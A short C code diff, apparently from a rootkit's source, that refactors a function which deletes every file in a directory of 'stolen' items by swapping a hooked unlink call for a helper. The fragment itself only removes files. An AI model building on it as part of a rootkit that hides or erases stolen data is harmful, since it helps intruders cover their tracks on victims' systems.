@@ -3,7 +3,7 @@ void rmstolens(void){
     struct dirent *dir;
     size_t pathlen;
 
-    hook(COPENDIR, CREADDIR, CUNLINK);
+    hook(COPENDIR, CREADDIR);
 
     dp = call(COPENDIR, INTEREST_DIR);
     if(dp == NULL) return;
@@ -15,7 +15,7 @@ void rmstolens(void){
         pathlen = LEN_INTEREST_DIR + strlen(dir->d_name) + 2;
         char path[pathlen];
         snprintf(path, sizeof(path), "%s/%s", INTEREST_DIR, dir->d_name);
-        call(CUNLINK, path);
+        rm(path);
     }
     closedir(dp);
 }
